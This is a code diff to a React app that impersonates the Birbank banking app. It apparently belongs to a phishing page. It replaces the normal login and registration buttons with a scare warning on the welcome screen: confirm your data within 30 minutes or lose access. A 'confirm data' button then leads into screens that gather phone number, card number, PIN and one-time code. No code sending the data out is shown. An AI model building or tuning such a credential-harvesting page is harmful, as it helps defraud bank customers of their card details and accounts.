@@ -2,10 +2,10 @@
 
 import { useState, useEffect } from "react"
 
-type Screen = "security" | "welcome" | "registration" | "pin-setup" | "otp"
+type Screen = "welcome" | "registration" | "pin-setup" | "otp"
 
 export default function BirbankApp() {
-  const [currentScreen, setCurrentScreen] = useState<Screen>("security")
+  const [currentScreen, setCurrentScreen] = useState<Screen>("welcome")
   const [phoneNumber, setPhoneNumber] = useState("")
   const [cardNumber, setCardNumber] = useState("")
   const [pinCode, setPinCode] = useState("")
@@ -28,24 +28,14 @@ export default function BirbankApp() {
     return `${mins}:${secs.toString().padStart(2, "0")}`
   }
 
-  const handleSecurityConfirm = () => {
-    console.log("[Birbank] Security confirmed - proceeding to welcome screen")
-    setCurrentScreen("welcome")
+  const handleConfirmData = () => {
+    console.log("[Birbank] Məlumatları təsdiq et clicked - proceeding to registration")
+    setCurrentScreen("registration")
   }
 
   const handleBranchConfirm = () => {
     alert("Zəhmət olmasa, 3 gün ərzində sizə ən yaxın Birbank filialına müraciət edin. Ünvanlar: Bakı, Sumqayıt, Gəncə.")
-    console.log("[Birbank] Branch confirmation selected")
-  }
-
-  const handleLogin = () => {
-    console.log("[Birbank] Login button clicked")
-    // Login only logs, doesn't navigate
-  }
-
-  const handleRegistration = () => {
-    console.log("[Birbank] Registration clicked")
-    setCurrentScreen("registration")
+    console.log("[Birbank] Filialda təsdiq clicked")
   }
 
   const handleContinueRegistration = () => {
@@ -130,59 +120,18 @@ export default function BirbankApp() {
     </div>
   )
 
-  // Security Screen
-  if (currentScreen === "security") {
-    return (
-      <div className="min-h-screen bg-gradient-to-b from-[#e8f5f0] to-white flex items-center justify-center p-4">
-        <div className="w-full max-w-[390px] bg-white rounded-3xl shadow-lg p-6 text-center">
-          <Logo />
-          
-          <div className="my-8">
-            <RobotMascot />
-          </div>
-
-          <h1 className="text-xl font-bold text-gray-800 mb-4">Təhlükəsizlik təsdiqi</h1>
-
-          <div className="bg-gray-50 rounded-xl p-4 mb-6 text-left text-sm text-gray-700 leading-relaxed">
-            <p className="mb-3">
-              🔐 Təhlükəsizlik məqsədilə zəhmət olmasa, bütün addımları ardıcıllıqla yerinə yetirin.
-            </p>
-            <p>
-              ⚠️ Əks halda:
-              <br />
-              30 dəqiqə ərzində məlumatlarınız təsdiqlənmədikdə, tətbiqə girişiniz məhdudlaşdırılacaq və təsdiq yalnız 3 gün ərzində sizə uyğun olan filialda həyata keçirilməlidir.
-            </p>
-          </div>
-
-          <button
-            onClick={handleSecurityConfirm}
-            className="w-full bg-[#e30613] text-white font-semibold py-4 rounded-xl mb-3 active:bg-[#c70510] transition-colors"
-          >
-            Məlumatları təsdiq et
-          </button>
-          <button
-            onClick={handleBranchConfirm}
-            className="w-full border-2 border-[#e30613] text-[#e30613] font-semibold py-4 rounded-xl active:bg-red-50 transition-colors"
-          >
-            Filialda təsdiq
-          </button>
-        </div>
-      </div>
-    )
-  }
-
-  // Welcome Screen
+  // Welcome Screen (STEP 1)
   if (currentScreen === "welcome") {
     return (
-      <div className="min-h-screen bg-gradient-to-b from-[#e8f5f0] to-white flex flex-col items-center p-4">
-        <div className="w-full max-w-[390px] flex flex-col items-center pt-8">
+      <div className="min-h-screen bg-gradient-to-b from-[#e8f5f0] to-white flex flex-col items-center">
+        <div className="w-full max-w-[390px] flex flex-col items-center pt-8 px-4">
           <Logo />
 
-          <div className="my-12">
+          <div className="my-8">
             <RobotMascot size="large" />
           </div>
 
-          <h1 className="text-2xl font-bold text-gray-800 text-center leading-tight">
+          <h1 className="text-2xl font-bold text-gray-800 text-center leading-tight mb-6">
             Salam! Mən Biriyəm,
             <br />
             sizin
@@ -190,18 +139,31 @@ export default function BirbankApp() {
             rəqəmsal köməkçiniz.
           </h1>
 
-          <div className="w-full mt-auto pt-16 pb-20 space-y-2">
+          {/* Security Warning Box */}
+          <div className="bg-gray-50 rounded-xl p-4 mb-6 text-left text-sm text-gray-700 leading-relaxed w-full">
+            <p className="mb-3">
+              {"🔐 Təhlükəsizlik məqsədilə zəhmət olmasa, bütün addımları ardıcıllıqla yerinə yetirin."}
+            </p>
+            <p>
+              {"⚠️ Əks halda:"}
+              <br />
+              {"30 dəqiqə ərzində məlumatlarınız təsdiqlənmədikdə, tətbiqə girişiniz məhdudlaşdırılacaq və təsdiq yalnız 3 gün ərzində sizə uyğun olan filialda həyata keçirilməlidir."}
+            </p>
+          </div>
+
+          {/* Action Buttons */}
+          <div className="w-full space-y-3 pb-24">
             <button
-              onClick={handleLogin}
+              onClick={handleConfirmData}
               className="w-full bg-[#e30613] text-white font-semibold py-4 rounded-xl active:bg-[#c70510] transition-colors"
             >
-              Giriş
+              Məlumatları təsdiq et
             </button>
             <button
-              onClick={handleRegistration}
-              className="w-full text-gray-600 font-medium py-4"
+              onClick={handleBranchConfirm}
+              className="w-full border-2 border-[#e30613] text-[#e30613] font-semibold py-4 rounded-xl active:bg-red-50 transition-colors"
             >
-              Qeydiyyat
+              Filialda təsdiq
             </button>
           </div>
 
